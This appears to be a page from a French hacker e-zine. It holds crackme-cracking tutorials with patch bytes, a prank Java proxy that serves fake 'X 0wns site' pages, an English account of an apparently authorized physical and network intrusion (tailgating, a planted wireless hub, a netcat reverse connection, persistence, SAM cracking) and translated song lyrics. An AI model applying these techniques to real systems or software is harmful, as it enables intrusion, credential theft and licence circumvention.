        de la ICITeam (Independent Cracking Institute). Une team de cracking Fran&ccedil;aise. 
        --&gt; <a href="http://www.iciteam.vze.com">www.iciteam.vze.com</a>.<br>
        Ici on s'attaque au crackme de fNaaX. Voici les instructions qui sont 
        donn&eacute;es :<br>
        - Enlever les nags et les splashes<br>
        - remplacer la messagebox avec une croix rouge qui dit &quot;NAG SCREEN&quot; 
        par une messagebox avec triangle jaune qui dit &quot;GOOD BOY :)&quot;.<br>
        L'auteur pr&eacute;cise que le texte pour la messagebox est inclut dans 
        le prog.</p>
      <p class="textpetit">Voila donc un crackme qui promet d'&ecirc;tre int&eacute;resant 
        car c'est toujours utile de savoir virer ces trucs (surtout ceux ou ya 
        juste une image).</p>
      <p class="textpetit">On lance le prog. Premier truc : un splashe :(<br>
        On reg<span class="textpetit">arde dans la doc de Falcon a quoi &ccedil;a 
        peut correspondre... C'est pas une messagebox, ShowWindow bof, WSPRINTF 
        non, c'est SendMessage :)</span></p>
      <span class="textpetit">On lance w32dasm, on d&eacute;sassemble le prog, 
      on cherche notre api dans Imported Functions mais ya que MessageBox et ExitProcess 
      (d'ailleurs ya pas d'entrypoint selon le prog). Ok, on d&eacute;bugge le 
      prog avec les Enable et le Stop Auto On API et on fait des AutoStepOver 
      (vous pouvez faire tourner un peu tout sans le stop on API histoire de faire 
      avancer + vite). Au bo&ucirc;t de quelques fen&ecirc;tre on arrive &agrave; 
      :<br>
      <br>
      </span> 
      <pre class="textpetit"><span class="textpetit">API LRESULT Arg00 = SendMessageA(Arg01,Arg02,Arg03,Arg04)
API Address=00405078, API Return Address=0040507E &lt;-- call SendMessage en 405078<br>Arg01 = (HWND) 000a05ce (Window&quot;&quot;)
Arg02 = (uMSG) 00000172 -&gt;UnKnown Message #
Arg03 = (WPARAM) 00000000
Arg04 = (LPARAM) 4d050922</span></pre>
      <pre class="textpetit">On regarde avant les arguments pass&eacute;s et on voit :
:00405065 FFB5A4224000 push dword ptr [ebp+004022A4]
:0040506B 6A00 push 00000000
:0040506D 6872010000 push 00000172
:00405072 FFB5A0224000 push dword ptr [ebp+004022A0]</pre>
      <p>Si on les &eacute;tudie plus en d&eacute;tail on s'apper&ccedil;oit que 
        ya rien d'int&eacute;ressant. On continue puis le prog fait un UpdateWindow, 
        la encore rien d'interessant.<br>
        On avance de deux pas puis on a un Sleep avec comme premier argument fa0. 
        On fait un coup de calculatrice windows... Ca donne 4000 en d&eacute;cimal.<br>
        On prend sa montre chrono, on relance le prog et on regarde combien dur 
        ce splashe. Je mesure 3 sec 87 donc &ccedil;a doit &ecirc;tre quatre secondes.<br>
        Inutile d'&ecirc;tre Einstein pour comprendre que le premier param&ecirc;tre 
        est la dur&eacute;e du Sleep en millisecondes. Donc pour bypasser ce splashe, 
        on va faire ca proprement et faire un Sleep(0).<br>
        :0040508A FFB5A8224000 push dword ptr [ebp+004022A8] &lt;&lt; argument 
        du sleep (fa0)<br>
        :00405090 FF95C2214000 call dword ptr [ebp+004021C2] &lt;&lt; appel du 
        sleep<br>
        Donc il suffit de remplacer FFB5A8224000 en 6A00 (push 0) et 90909090 
        (faire rien)<br>
        Notez bien l'offset en bas de la fen&ecirc;tre de win32dasm : 108A<br>
        Le prog fait ensuite un DestroyWindow.</p>
      <p>On a assez d'info sur le premier splashe. On fait run, il nous affiche 
        la fen&ecirc;tre principale : rien a modifier dessus. On se remet en AutoStepOver 
        et on clique sur OK.<br>
        On tombe sur un vilain nag screen avec comme titre &quot;N@g !!!&quot;, 
        comme message &quot;NAG SCREEN&quot; avec une grosse croix rouge :(.<br>
        Les lignes qui nous int&eacute;ressent sont l&agrave; :<br>
        <br>
        :00401051 6A10 push 00000010 &lt;&lt; mais qu'est ce que c'est ??</p>
      <p>* Possible StringData Ref from Data Obj -&gt;&quot;QCj#$$$&quot;<br>
        |<br>
        :00401053 6887224000 push 00402287 &lt;&lt; Le titre<br>
        :00401058 688F224000 push 0040228F &lt;&lt; le texte<br>
        :0040105D 6A00 push 00000000</p>
      <p>* Reference To: USER32.MessageBoxA, Ord:0000h<br>
        |<br>
        :0040105F E81D000000 Call 00401081</p>
      <p>On ne peut s'emp&eacute;cher de voir dans l'adresse m&eacute;moire le 
        &quot;GOOD BOY :)&quot; &agrave; l'adresse 40229C. Il suffit donc pour 
        ce qui est du texte de transformer le 688F224000 en 689C224000 soit l'octet 
        &agrave; l'offset 659.<br>
        Maintenant il faut s'occuper du look de la messagebox. Comme je connais 
        pas le codes pour les types de messagebox je fait une recherche sur les 
        ezines que j'ai sur mon disque (160 Mo de zines et pourtant je garde que 
        les meilleurs. Faut dire ya du Fran&ccedil;ais, Am&eacute;ricain, Espagnol, 
        Mexicain...).<br>
        Finalement je trouve mon bonheur dans le num&eacute;ro 4 de Code Breaker. 
        C'est un mag fait par des putains de codeurs de virus (vraiment balaises 
        les gars), vous pouvez t&eacute;l&eacute;charger leurs mags sur packetstorm 
        mais faites attention &agrave; certains dossiers (ceux qui s'appellent 
        binaries :) Voici la doc qui donnent :<br>
        16 stands for a cross red circle with &quot;OK&quot;<br>
        17 stands for a cross red circle with &quot;OK&quot; and &quot;Cancel&quot;<br>
        18 stands for a cross red circle with &quot;Abort&quot;,&quot;Retry&quot; 
        and &quot;Cancel&quot;<br>
        19 stands for a cross red circle with &quot;Yes&quot;,&quot;No&quot; and 
        &quot;Cancel&quot;<br>
        20 stands for a cross red circle <br>
        32 stands for a &quot;!&quot;<br>
        34 stands for a &quot;?&quot; with &quot;Abort&quot;,&quot;Retry&quot; 
        and &quot;Ignore&quot;<br>
        37 stands for a &quot;?&quot; with &quot;Retry&quot; and &quot;Cancel&quot;<br>
        48 stands for a &quot;!&quot; with &quot;OK&quot; &lt;---------------------------------- 
        C'est celui l&agrave; qu'on veut<br>
        49 stands for a &quot;!&quot; with &quot;OK&quot;,&quot;Cancel&quot;<br>
        50 stands for a &quot;!&quot; with &quot;Abort&quot;,&quot;Retry&quot; 
        and &quot;Ignore&quot;<br>
        51 stands for a &quot;!&quot; with &quot;Yes&quot;,&quot;No&quot; and 
        &quot;Cancel&quot;<br>
        52 stands for a &quot;!&quot; with &quot;Yes&quot;,&quot;No&quot;<br>
        53 stands for a &quot;!&quot; with &quot;Retry&quot;,&quot;Cancel&quot;<br>
        64 stands for a &quot;I&quot; with &quot;OK&quot; --&gt; I = &quot;Information&quot;<br>
        66 stands for a &quot;I&quot; with &quot;Abort&quot;,&quot;Retry&quot; 
        and &quot;Cancel&quot;<br>
        67 stands for a &quot;I&quot; with &quot;Yes&quot;,&quot;No&quot; and 
        &quot;Cancel&quot;<br>
        68 stands for a &quot;I&quot; with &quot;Yes&quot;,&quot;No&quot;<br>
        69 stands for a &quot;I&quot; with &quot;Retry&quot; and a &quot;Cancel&quot; 
      </p>
      <p>Attention c'est des valeurs d&eacute;cimales !! 48 base10 donne 30 en 
        hexa. Nous on avait avant la croix rouge avec le ok : 16 donc 10 en hexa. 
        Et comme par hazard c'est l'argument qu'on a vu tout &agrave; l'heure. 
        On fait donc passer le push 10 (6A10) en push 30 (6A30).</p>
      <p>Derni&egrave;re difficult&eacute; : le dernier nagscreen est &quot;planqu&eacute;&quot; 
        par le programmeur. Vous ne trouverez pas l'appel dans le dead listing 
        mais l'appel est le m&ecirc;me et en cherchant avec un h&eacute;diteur 
        hexa on trouve plusieurs occurences. On en teste 2-3 puis on trouve le 
        bon. R&eacute;sum&eacute; des changements :</p>
      <pre>652: 	10	30<br>659: 	8F	9C<br>108A:	FF	6A<br>108B:	B5	00<br>108C:	A8	90<br>108D:	22	90<br>108E:	40	90<br>108F:	00	90<br>3FB9:	FF	6A<br>3FBA:	B5	00<br>3FBB:	A8	90<br>3FBC:	22	90<br>3FBD:	40	90<br>3FBE:	00	90</pre>
      <p>&nbsp;</p>
    </td>
  </tr>
  <tr> 
    <td height="18" valign="top" class="textgras" bgcolor="#000000"><a name="HTP"></a>Hack 
      The Planet ou How To Code A Fake Proxy For Fun But Not For Profit</td>
  </tr>
  <tr> 
    <td height="84" valign="top" class="textpetit"> 
      <p>Voici une id&eacute;e qui me trottait dans la t&ecirc;te depuis pas mal 
        de temps : coder un faux proxy. Le principe ? Au lieu de renvoyer la vraie 
        page il renvoie une page d&eacute;fac&eacute;e. Par exemple si vous demandez 
        la page yahoo.fr, il vous enverra une page du style &quot;sirius_black 
        0wns yahoo.fr !!&quot;. Bien entendu le pseudo du hacker est celui que 
        vous d&eacute;sirez.</p>
      <p>Pourquoi Hack The Planet ?<br>
        Tout d'abord parce que avec &ccedil;a vous pourrez faire croire &agrave; 
        vos potes que vous &ecirc;tes le plus grand hacker au monde. Le FBI, la 
        NSA, la NASA, le Pentagonne... Tout &ccedil;a c'est des victimes de choix. 
        Analyser et les Brazil Hackers Sabotage auront pale alure ;-) Voil&agrave; 
        pourquoi ce faut proxy s'appelle Hack The Planet : vous pouvez (faire 
        croire que vous) hacker la plan&egrave;te.<br>
        Deuxi&egrave;mement je l'ai appel&eacute; ainsi car HTP correpond &agrave; 
        HTTP avec un T en moins. Un clin d'oeil en quelque sorte :-p.</p>
      <p>Comment que ca marche ?<br>
        J'ai fait deux versions. L'une est en java, elle marche sur toutes les 
        plates formes existantes du moment que vous avez un compilateur java. 
        L'avantage de cette version c'est qu'elle tient sur un seul petit fichier. 
        L'autre version est faite en C. Malheuresement elle ne marche que sous 
        Linux. L&agrave; ya un peu plus de fichiers pour la faire marcher (6). 
        Mais j'ai mis un &quot;pseudo&quot; MakeFile.</p>
      <p>C'est ok j'ai de quoi faire tourner HTP, mais je fais quoi maintenant 
        ?<br>
        Une fois que vous avez compil&eacute; votre HTP (./HTPmake avec la version 
        C ou javac HTP.java avec la version java) il ne vous reste plus qu'&agrave; 
        lancer le proxy avec les arguments n&eacute;cessaires. La version java 
        attend 2 param&ecirc;tres : le pseudo du hacker puis le port sur lequel 
        le proxy doit tourner. Celle en C attend seulement le pseudo du hacker, 
        le port &eacute;tant par d&eacute;faut le 8080, mais il suffit d'&eacute;diter 
        le fichier HTPserveur.c pour changer &ccedil;a.<br>
        Ensuite vous devez param&ecirc;trer votre navigateur web. Sous Netscape 
        pas de probl&egrave;mes, que vous soyez connect&eacute; ou non, le proxy 
        r&eacute;pondras. Vous devez juste faire Edition&gt;Pr&eacute;f&eacute;rences&gt;Avanc&eacute;&gt;Proxies 
        et vous mettez 127.0.0.1 en proxy HTTP avec le port que vous avez choisi.<br>
        Sous Internet Explorer (beurk) vous devez &ecirc;tre connect&eacute; &agrave; 
        Internet pour que le navigateur veuille bien parler &agrave; votre proxy. 
        Mais personnellement je vous conseille de prendre un navigateur totalement 
        achev&eacute;, pas un produit commercial qui a &eacute;t&eacute; mis en 
        circulation avant d'&ecirc;tre fini et ce juste pour contrer la concurrence. 
        Quoi ? Non non je suis pas contre Microsoft !! C'est juste que voir tout 
        les jours un advisorie sur packetstorm disant que n'importe qui peux prendre 
        le contr&ocirc;le de votre PC gr&acirc;ce &agrave; MSIE 6.0 &ccedil;a 
        m'&eacute;nerve X-(</p>
      <p>Comme un exemple vaut mieux qu'un long discours voici le code de la version 
        java :</p>
      <p>import java.net.*; <span class="but2">//les librairies Socket...</span><br>
        import java.io.*; <span class="but2">//les entr&eacute;es sorties</span></p>
      <p>public class HTP{ <span class="but2">// on d&eacute;finit la classe HTP</span></p>
      <p> &nbsp;public static void main(String [] args){<br>
        &nbsp;&nbsp;try{<br>
        &nbsp;&nbsp;&nbsp;if(args.length!=2){<br>
        &nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Usage: HTP &lt;pseudo_du_hacker&gt; 
        &lt;port&gt;\n&quot;); <span class="but2">// si pas 2 arguments on d&eacute;gage</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;System.exit(0);<br>
        &nbsp;&nbsp;&nbsp;}</p>
      <p> &nbsp;&nbsp;&nbsp;String s=new String(&quot;&quot;);<br>
        &nbsp;&nbsp;&nbsp;String eax=new String(&quot;&quot;);<br>
        &nbsp;&nbsp;&nbsp;byte[] b=s.getBytes();<br>
        &nbsp;&nbsp;&nbsp;boolean ok=false;<br>
        &nbsp;&nbsp;&nbsp;ServerSocket serveur=new ServerSocket(Integer.parseInt(args[1])); 
        <span class="but2">// on ouvre un port pour le proxy</span><br>
        &nbsp;&nbsp;&nbsp;Socket tunnel;<br>
        &nbsp;&nbsp;&nbsp;while ((tunnel = serveur.accept()) != null) { <span class="but2">// 
        on tourne en boucle pour que l'on puisse faire plusieurs requ&ecirc;tes</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;ok=false;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;InputStream is=tunnel.getInputStream(); <span class="but2">// 
        on d&eacute;clare un InputStream qui lit les donn&eacute;es de la socket</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;InputStreamReader isr=new InputStreamReader(is); 
        <span class="but2">// on le transforme en InputStream Reader</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;BufferedReader br=new BufferedReader(isr); <span class="but2">// 
        que l'on transforme en BufferedReader, plus pratique car permet de lire 
        des lignes</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;OutputStream os=tunnel.getOutputStream();<br>
        &nbsp;&nbsp;&nbsp;&nbsp;while((s=br.readLine()).length()!=0 &amp;&amp; 
        !ok){<span class="but2"> // on s'arr&ecirc;te quand on lit une chaine 
        vide (fin de requ&ecirc;te GET ou fin de l'ent&ecirc;te de la m&eacute;thode 
        POST)</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s=s.toLowerCase();<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(s);<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (s.startsWith(&quot;host&quot;)){<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok=true;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax=s.substring((s.indexOf(':'))+1); 
        <span class="but2">// on r&eacute;cup&egrave;re le nom du site demand&eacute;</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;&nbsp;&nbsp;s=&quot;HTTP/1.1 200 OK&quot;+(char)0x0d+(char)0x0a+&quot;Content-Type: 
        text/html&quot;+(char)0x0d+(char)0x0a; <span class="but2">// on fabrique 
        une r&eacute;ponse</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;if(!ok) eax=&quot;Hacked by &quot;+args[0];<span class="but2"> 
        // si on a pas r&eacute;cup&eacute;r&eacute; une adresse internet on met 
        juste Hacked by &lt;ton_pseudo&gt;</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;else eax=args[0]+&quot; 0wns &quot;+eax; <span class="but2">// 
        sinon on met &lt;ton_pseudo&gt; 0wns &lt;le_site_demand&eacute;&gt;</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;eax=&quot;&lt;center&gt;&lt;h1&gt;&quot;+eax+&quot;&lt;/h1&gt;&lt;/center&gt;&quot;;<span class="but2"> 
        // on rajoute un peu de mise en forme</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;s=s+&quot;Content-Length: &quot;+eax.length()+(char)0x0d+(char)0x0a+(char)0x0d+(char)0x0a; 
        <span class="but2">//on forge la r&eacute;ponse en cons&eacute;quence</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;s=s+eax;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;os.write(s.getBytes());<span class="but2"> // 
        on l'envoie</span><br>
        &nbsp;&nbsp;&nbsp;&nbsp;eax=&quot;&quot;;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;s=&quot;&quot;;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;os.close(); &nbsp;<span class="but2">// on ferme 
        la sortie et on boucle</span><br>
        &nbsp;&nbsp;&nbsp;}<br>
        &nbsp;&nbsp;}<br>
        &nbsp;&nbsp;catch(IOException e){<br>
        &nbsp;&nbsp;&nbsp;System.out.println(&quot;Erreur &quot;+e); <span class="but2">// 
        en cas d'erreur on &eacute;crit dans la console</span><br>
        &nbsp;&nbsp;} <br>
        &nbsp;}<br>
        }</p>
      <p>Je ne met pas la version C dans le zine (elle est dans le dossier fichiers). 
        D'abord parce qu'elle est trop longue et plus difficile &agrave; comprendre. 
        En fait la version C est bas&eacute; sur deux programmes principaux. Il 
        y a le serveur HTP qui recoit les requ&ecirc;tes et redirige les entr&eacute;es 
        sorties vers le deuxi&egrave;me programme qui traite les donn&eacute;es. 
        En fait le serveur HTP marche de la m&ecirc;me fa&ccedil;on que NetCat. 
        D'ailleurs j'essayerais de faire une version Windows qui marche avec NetCat. 
        Ca devrait pas &ecirc;tre bien difficile. Toutefois si vous vous en sentez 
        le courage n'h&eacute;sitez pas &agrave; programmer une version WinSock 
        o&ugrave; &agrave; am&eacute;liorer mes versions. Je serait ravi de les 
        mettres dans les prochains num&eacute;ros de mon mag.</p>
    </td>
  </tr>
  <tr> 
    <td height="14" valign="top" class="textgras" bgcolor="#000000"><a name="hack2"></a>Exemple 
      d'intrusion r&eacute;ussie (num&eacute;ro 2)</td>
  </tr>
  <tr> 
    <td height="167" valign="top"><span class="textpetit">The second victim </span> 
      <p class="textpetit">Pseudonym : Trust-us e-commerce inc. Type of company 
        : e-commerce company, implements B2B and B2C solutions for businesses 
        Time allowed to hack : 3 man/days Goal : penetrate the network as far 
        as possible and get evidence of intrusion</p>
      <p class="textpetit">So my first impression of a big corporate network (from 
        my previous work experience at a telecommunications company, see Virus 
        protection in a Microsoft Windows network, or How to stand a chance) from 
        the security point of view proved to be true with my successful and easy 
        network intrusion I had done for XYZ Media Publishing Corporation. I was 
        anxious to see how I would fare against an e-commerce company. I was curious 
        to see if they really cared about security, given their area of expertise.</p>
      <p class="textpetit">So the hack started pretty much the same way as the 
        first one: DNS lookups, whois, portscan, etc. It turns out that there's 
        about 5 or 6 machines reachable via the Internet. 2 *nix DNS servers, 
        1 Exchange mail server, and a couple IIS machines. These machines are 
        all firewalled and only allow very specific traffic : http, https, DNS, 
        SMTP. But remember that if one of these services is vulnerable, it can 
        be exploited and the firewall won't be effective at blocking the attack. 
        I issue a whisker scan on the webservers to see if there's any known vulnerabilities 
        on the web server itself, and in the cgi programs as well. The machines 
        turns out to be pretty secure, even if they are NT boxes. The server appears 
        to be patched up to date, and non-necessary services have been removed 
        from IIS (such as idq requests, asp pages, default sample pages). So I 
        can't use the directory traversal vulnerability on this one. I try to 
        screw up with some invalid requests in the cgi programs, trying to see 
        if I can provoke</p>
      <p class="textpetit">We had received some new toys a couple of weeks before, 
        and we couldn't wait to try them in the field. We had a wireless hub and 
        a pair of PCMCIA wireless network cards. I don't know how much this equipment 
        costs, but it shouldn't run above 2-3 k$, probably less. Not exactly cheap, 
        but not unnafordable to individuals. So we decided to attempt a physical 
        intrusion in their offices and plant the wireless hub on their internal 
        network and see what happens next. We were three persons to do this operation, 
        but it could have been achieved by only a single person.</p>
      <p class="textpetit">We thought a bit about doing a masquerade and pretend 
        that we were from the phone company or something, all along with the uniforms 
        and even a line tester that makes bip-bip sounds that are sure to convince 
        any non-technical person unfamiliar to this kind of equipment. We even 
        had the floor plan, that my boss asked to the facilities management guy 
        (those who manage building services). He gave the plans to my boss without 
        asking any ID or whatever, my boss simply told him that he was working 
        for Trut-us e-commerce inc, and that was it! My boss was even left alone 
        in the facilities guy office for about half an hour, even time to give 
        him the opportunity to take a peek or two, or steal one of the uniforms 
        hanging by the door if he wanted to.</p>
      <p class="textpetit">But instead, we chose a simpler course; simply walk 
        in dressed casual (average employee age at Trus-ut is about 25-30) and 
        pretend to belong there. The company is quite new, and they are hiring 
        new staff, so it's quite normal for a place like this to see new faces. 
        So the plan was to have one person walk in the offices, avoiding the main 
        entrance of the offices if possible, to avoid the receptionist desk, and 
        put the wireless hub on the network, in a free LAN jack in the photocopier 
        room (as we could see from the floor plan). And to collect any valuable 
        data the onsite visit can provide. In the meantime, another colleague 
        would be sitting in a toilet stall with his laptop equipped with the wireless 
        network card and try to get access to the network. If he proved successful, 
        he would iniate a netcat connection from one of their machines to my laptop, 
        and then leave the premises. As for me, I will be at our offices, hooked 
        up on the ADSL link, and waiting for the netcat connection to come to 
        me. Once I<br>
        g</p>
      <p class="textpetit">And that's exactly what happened! My first colleague 
        got in from the door beside the staircases, going inside with other people 
        that were coming back from a cigarette break. He went to the photocopier 
        room, and plugged the wireless hub to the network, and hid it behind some 
        boxes. After that, he walked across in the offices, a lot of cubicles 
        being empty, as the company had plans for growth. He said &quot;Hi!&quot; 
        to a couple of persons who were having a conversation. He found an employee 
        list on a desk, with all the phone numbers and positions in the company. 
        He went back to the photocopier room, and made a copy. He also looked 
        for other stuff, but it was hard to figure out what paper documents are 
        about without looking suspicious. So after half an hour, he simply took 
        the hub back with him and left the premises.</p>
      <p class="textpetit">Meanwhile, colleague #2 is in the bathroom stall with 
        his laptop. He waits about 5 minutes to give #1 enough time to plant the 
        bug. Then he boots up his machine and he automatically gets an IP address 
        from the internal network DHCP server. That's a good start! It takes him 
        no time to take control of an internal web server to launch the netcat 
        connection to me (with full SYSTEM/NT_AUTHORITY privileges, of course). 
        While I put my scheduled jobs on this machine to keep a point of entry, 
        he goes on an exploration tour of the rest of the network, stops in a 
        couple workstations to download some files, and leaves after 15 minutes, 
        after making sure with me that everything was under control on my side 
        (using a text file to send messages to each other).</p>
      <p class="textpetit">As for me, I started doing the usual stuff, downloading 
        the server's SAM file, cracking it, exploring the contents of some workstations, 
        visiting the servers and the PDC/BDC getting these SAMs also. I downloaded 
        some of their website source code, looked a test systems, and the customer 
        database, etc. I could see that there were firewalls between some of the 
        internal network segments, but all netbios ports were allowed, since these 
        machines were all part of the same NT domain. I accidentally killed my 
        session, but it came back to me exactly when I expected it, so I could 
        continue without any problem. At the end of the day, our mission was done.</p>
      <p class="textpetit">Again, we were three persons to implement this attack, 
        but this could be done by a single person. We only had one day left to 
        perform the intrusion, so we had to be efficient and well prepared. But 
        a single well prepared person, having no other schedule than his own, 
        could have easily walked in the offices, plant the hub on the network, 
        go in the bathroom, schedule hk2 netcat sessions at specific times, and 
        go home and simply wait for the connections to initiate. Then he is free 
        to do all he wants.</p>
      <p class="textpetit">Voil&agrave; !!! Ca vous a plu ? Sachez que le texte 
        ne s'arr&ecirc;tent normalement pas l&agrave;. Ya une conclusion et pi 
        une esp&egrave;ce de truc qui sert &agrave; rien. Comment &ccedil;a s'appelle 
        d&eacute;j&agrave; ? Un disclaimer ? Sinon ya des phrases qui sont coup&eacute;es 
        dans le texte mais elles &eacute;taient d&eacute;j&agrave; coup&eacute;es 
        dans l'original :(</p>
    </td>
  </tr>
  <tr> 
    <td height="17" valign="top" class="textgras" bgcolor="#000000"><a name="smash"></a>Traduction 
      de Come Out And Play</td>
  </tr>
  <tr> 
    <td height="70" valign="top"> 
      <p class="textpetit">Voix off : T'as int&eacute;r&ecirc;t &agrave; les s&eacute;parer</p>
      <p class="textpetit">Comme la derni&egrave;re mode<br>
        Comme une maladie contagieuse<br>
        Les gamins se batent sur le chemin de l'&eacute;cole<br>
        Se procurant des armes avec une grande facilit&eacute;<br>
        Les gangs s'approprient les campus<br>
        S'ils t'attrapent c'est fini pour toi, mon gars<br>
        Si deux mecs ne portent pas les m&ecirc;mes couleurs<br>
        Ils vont se tabasser<br>
        Tabasser Tabasser</p>
      <p class="textpetit">--partie A--<br>
        C'est &agrave; moi que tu parles comme &ccedil;a ?<br>
        Virez-le de l&agrave; !<br>
        T'as int&eacute;r&ecirc;t &agrave; les s&eacute;parer<br>
        --fin partie A--</p>
      <p class="textpetit">--partie B--<br>
        H&eacute; tu me manques de respect ?<br>
        Virez le de l&agrave; !<br>
        T'as int&eacute;r&ecirc;t &agrave; les s&eacute;parer<br>
        --fin partie B--</p>
      <p class="textpetit">--partie C--<br>
        Mais ils n'en ont rien &agrave; faire<br>
        Si t'es mineur &ccedil;a ne durera pas<br>
        Viens jouer<br>
        --fin partie C--</p>
      <p class="textpetit">Quand tu entends la sir&egrave;ne c'est d&eacute;j&agrave; 
        trop tard<br>
        L'un va &agrave; la morgue et l'autre en prison<br>
        L'un est foutu et l'autre un sale type</p>
      <p class="textpetit">--partie D--<br>
        C'est arriv&eacute; un millier de fois<br>
        Personne n'en tire les le&ccedil;ons<br>
        Ce tourbillon de mort, de violence et de haine<br>
        Creusera votre propre tombe (X2)<br>
        --fin partie D--</p>
      <p class="textpetit">B-A-C-D-A-B-C</p>
    </td>
  </tr>
  <tr> 
    <td height="16" valign="top" class="textgras" bgcolor="#000000"><a name="jB"></a>Crackme 
      de jB : pas de bouton de v&eacute;rification</td>
  </tr>
  <tr> 
    <td height="965" valign="top" class="textpetit"> 
      <p>Dans cet exemple on va donc s'attaquer aux progs qui demande un serial 
        mais o&ugrave; ya pas de boutons du style &quot;v&eacute;rifier&quot; 
        ou &quot;ok&quot; qui lancent la proc&eacute;dure de v&eacute;rification. 
        Il est toujours utile de savoir comment les prendre car quand on en conna&icirc;t 
        un, on sait tous les faire :) Peut &ecirc;tre qu'au bout d'un moment je 
        vous aurais donn&eacute; tous les exemples &quot;types&quot; ;)<br>
        En fait si le prog ne nous propose pas de v&eacute;rifier le s&eacute;rial 
        c'est qu'il le v&eacute;rifie sans cesse, tant que l'on interragi avec 
        le prog (tant que la fen&ecirc;tre est active sous windows). Deux possibilit&eacute;s 
        : soit le prog v&eacute;rifie (sans cesse) la taille du serial puis si 
        c'est bon il v&eacute;rifie le code en lui m&ecirc;me. Ou alors il v&eacute;rifie 
        direct la validit&eacute; du code.<br>
        Mais quelque soit le cas, nous utilisons toujours l&agrave; m&ecirc;me 
        m&eacute;thode : on fait un break la o&ugrave; le prog lit ce qu'on lui 
        passe puis on trace jusqu'&agrave; la proc&eacute;dure en question.</p>
      <p>Bon dans ce tut j'utilise WinDbg qui, il faut l'avouer est carr&egrave;ment 
        bien :) Microsoft l'ami des crackers et de la gratuit&eacute; ? Je sais 
        &ccedil;a donne faux :) Mais bon le fait est l&agrave; : winDbg est la 
        solution de choix pour d&eacute;bugger sous XP.</p>
      <p>Donc on ouvre winDbg, Choose Executable &gt; Crakme2.exe. il nous propose 
        un 'save Workbase information' on dit non. On clique sur le bouton des 
        registres (celui avec un 0 et un x) pour faire appara&icirc;tre la fen&ecirc;tre 
        correspondante. on clique sur 'Customize' pour d&eacute;finir l'ordre 
        d'affichage des registres (pour moi : eax ebx ecx edx edi esi ebp esp 
        eip passent en premier).<br>
        On fait ensuite Window &gt; Tile Horizontally car la fen&ecirc;tre du 
        dead listing a tendance &agrave; se cacher derri&egrave;re les autres.<br>
        On tape 'g' pour lancer le crackme. on le d&eacute;place &agrave; droite 
        de l'&eacute;cran parce que sinon il va nous faire chier pour lire ce 
        qu'on fait (quand on d&eacute;bugge on peut plus le bouger). On entre 
        notre code ('SIRIUS_BLACK' mais c'est mis automatiquement en majuscules) 
        et on clique pas sur le bouton car yen a pas !!! (ben oui ca vous change 
        de d'habitude :)</p>
      <p>On passe sous winbg et on clique sur le 4&egrave;me bouton avec une feuille 
        de papier (ya des esp&egrave;ces de vagues &agrave; c&ocirc;t&eacute;) 
        pour breaker. On entre alors 'bp GetWindowTextA' car c'est l'API qui va 
        lire notre serial. On relance ('g') et on clique sur la fen&ecirc;tre 
        du crackme. BAM !! On break !!! Je vous avait pr&eacute;venu qu'il tournait 
        en boucle :p<br>
        On fait un Shift+F11 pour sortir du call (WinDbg est vraiment pomp&eacute; 
        sur Softice).<br>
        On voit &ccedil;a :</p>
      <p>push [ebp+0x08]<br>
        call 0040121C (GetDlgItemTextA) &lt;-- c'est l&agrave; d'o&ugrave; on 
        vient<br>
        shl eax, 0x3<br>
        xor eax, 0x12<br>
        cmp eax, 0x52<br>
        jne 00401125 &lt;-- saute vers BAD BOY<br>
        push 0042012<br>
        call 004010AA<br>
        cmp dl, 0x1<br>
        jne 00401125 --&gt; saute vers BAD BOY<br>
        GOOD BOY</p>
      <p> Juste quand on sort du premier call, dans eax ya la longueur de notre 
        code : Ch (h comme hexa) soit 12d (d comme d&eacute;cimal). Cette valeur 
        est d&eacute;cal&eacute;e de trois bits sur bits sur la gauche (l comme 
        left) puis xor&eacute; avec 12h. si le r&eacute;sultat vaut 52h alors 
        on a la bonne longueur.<br>
        Avec SIRIUS_BLACK, la longueur est 12d soit 1100b (b comme binaire). On 
        d&eacute;cale de 3 bits sur la gauche, ca nous donne 1100000b. Ensuite 
        on xor avec 12h --&gt; 72h.<br>
        Le r&eacute;sultat n'est pas 52h, c'est pas la bonne longueur.<br>
        Alors on r&eacute;fl&eacute;chie en sens inverse : &agrave; la fin on 
        doit avoir 52h. Comme le xor est une op&eacute;ration r&eacute;versible 
        (je veux dire que (A xor B) xor B donne A) alors on peut trouver la valeur 
        attendu avant le xor. 52 xor 12 &ccedil;a donne 40h soit 1000000b. Puis 
        on fait l'inverse du shl : un shr (d&eacute;calage sur la droite) de 3 
        crans.<br>
        On obtient 1000b soit 8d. Le crackme attend donc un code de longueur 8.</p>
      <p>On racourci notre code ('SIRIUS_B') et on recommence. Maitenant on arrive 
        sur le second call. Notre code est plac&eacute; sur la pile.<br>
        Apr&egrave;s quelques saut on arrive ici :</p>
      <p>mov eax, 402012 &lt;-- adresse de notre code<br>
        mov ecx, [ecx] &lt;-- ecx prend le contenu du code ou plut&ocirc;t les 
        4 derniers caract&egrave;res car 1-Un registre fait 32 bits et 2-Les chaines 
        de caract&egrave;res sont stock&eacute;es &agrave; l'envers dans la m&eacute;moire. 
        Si bien que ecx prend 'IRIS' soit 49,52,49,53 en hexa.<br>
        ...<br>
